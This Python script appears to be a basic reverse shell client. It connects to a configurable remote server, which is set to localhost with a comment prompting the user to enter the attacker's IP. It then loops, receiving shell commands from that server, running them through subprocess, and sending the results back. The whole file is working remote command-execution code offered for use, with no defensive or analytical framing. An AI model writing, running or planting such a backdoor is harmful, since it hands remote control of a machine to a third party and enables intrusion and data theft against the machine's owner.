import socket
import subprocess

s = socket.socket()

SERVER_HOST = "localhost" # Enter ip address of server
SERVER_PORT = 8080
BUFFER_SIZE = 1024



# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

# receive the greeting message
message = s.recv(BUFFER_SIZE).decode()
print("Server:", message)


while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # execute the command and retrieve the results
    output = subprocess.getoutput(command)
    # send the results back to the server
    s.send(output.encode())
# close client connection
s.close()